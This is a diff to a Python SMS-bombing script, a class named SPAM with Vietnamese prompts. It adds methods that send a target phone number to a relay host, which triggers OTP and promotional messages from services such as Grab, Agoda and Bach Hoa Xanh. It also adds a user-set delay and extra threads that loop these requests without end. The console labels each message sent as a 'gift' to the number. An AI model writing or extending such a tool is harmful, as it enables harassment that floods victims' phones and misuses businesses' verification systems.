@@ -376,54 +376,128 @@ class SPAM:
             print(self.format_print_success("TV360","    Tặng quà thành công cho",str(self.phone)))
         except:
             print(self.format_print_error("TV360","Hết quà"))
+    def TGDĐ(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone='+self.phone[1:])
+            print(self.format_print_success("TGDĐ","     Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("TGDĐ","Hết quà"))
+    def NH247(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/nhap-hang-247?phone='+self.phone[1:])
+            print(self.format_print_success("NH247","    Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("NH247","Hết quà"))
+    def Elines(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/elines?phone='+self.phone[1:])
+            print(self.format_print_success("Elines","   Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("Elines","Hết quà"))
+    def BHX(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone='+self.phone[1:])
+            print(self.format_print_success("BHX","      Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("BHX","Hết quà"))
+    def Grab(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/grab-food?phone='+self.phone[1:])
+            print(self.format_print_success("Grab","     Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("Grab","Hết quà"))
+    def Go2joy(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/go2joy?phone='+self.phone[1:])
+            print(self.format_print_success("Go2joy","   Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("Go2joy","Hết quà"))
+    def Agoda(self):
+        try:
+            requests.get('https://howtospamsms.herokuapp.com/agoda?phone='+self.phone[1:])
+            print(self.format_print_success("Agoda","    Tặng quà thành công cho",str(self.phone)))
+        except:
+            print(self.format_print_error("Agoda","Hết quà"))
     def run_sendotp(self):
         while True:
             self.send_otp()
-            time.sleep(1)
+            time.sleep(self.delay)
     def run_sendcode(self):
         while True:
             for x in range(3):
                 self.send_code()
-                time.sleep(1)
-            time.sleep(1)    
+                time.sleep(self.delay)
+            time.sleep(self.delay)    
     def run_api_v1(self):
         while True:
             self.Gbay()
+            time.sleep(self.delay)
             self.zalopay()
+            time.sleep(self.delay)
             self.moca()
-            time.sleep(1)
+            time.sleep(self.delay)
     def run_api_v2(self):
         while True:
             self.vntrip()
+            time.sleep(self.delay)
             self.vtmoney()
+            time.sleep(self.delay)
             self.tv360()
-            time.sleep(1)
+            time.sleep(self.delay)
     def run_api_v3(self):
         while True:
             self.facebook()
+            time.sleep(self.delay)
             self.f88()
+            time.sleep(self.delay)
             self.vay_vnd()
-            time.sleep(1)
+            time.sleep(self.delay)
     def run_api_v4(self):
         while True:
             self.lozi()
+            time.sleep(self.delay)
             self.vieon()
+            time.sleep(self.delay)
             self.findo()
-            time.sleep(1)
+            time.sleep(self.delay)
     def run_api_v5(self):
         while True:
             self.meta_vn()
+            time.sleep(self.delay)
             self.vay_semo()
+            time.sleep(self.delay)
             self.fpt()
-            time.sleep(1)
+            time.sleep(self.delay)
     def run_api_v6(self):
         while True:
             self.tiki()
+            time.sleep(self.delay)
             self.tamo()
+            time.sleep(self.delay)
             self.alfrescos()
-            time.sleep(1)
+            time.sleep(self.delay)
+    def run_api_v7(self):
+        while True:
+            self.Agoda()
+            time.sleep(self.delay)
+            self.Go2joy()
+            time.sleep(self.delay)
+            self.Grab()
+            time.sleep(self.delay)
+    def run_api_v8(self):
+        while True:
+            self.BHX()
+            time.sleep(self.delay)
+            self.Elines()
+            time.sleep(self.delay)
+            self.NH247()
+            time.sleep(self.delay)
+            self.TGDĐ()
+            time.sleep(self.delay)
     def run(self):
         while True:
+            self.banner()
+            self.delay = int(input(self.format_input("</>",f"|Shisui0711 YOUTUBE| NHẬP DELAY : ")))
             self.banner()
             self.phone = input(self.format_input("</>",f"|Shisui0711 YOUTUBE| NHẬP SỐ ĐIỆN THOẠI CẦN TẶNG QUÀ : "))
             if self.phone != '0988655794' and self.phone not in phone_while_list:
@@ -442,6 +516,8 @@ class SPAM:
         threading.Thread(target=self.run_api_v4).start()
         threading.Thread(target=self.run_api_v5).start()
         threading.Thread(target=self.run_api_v6).start()
+        threading.Thread(target=self.run_api_v7).start()
+        threading.Thread(target=self.run_api_v8).start()
 if __name__ == "__main__":   
     try:
         SPAM().run()
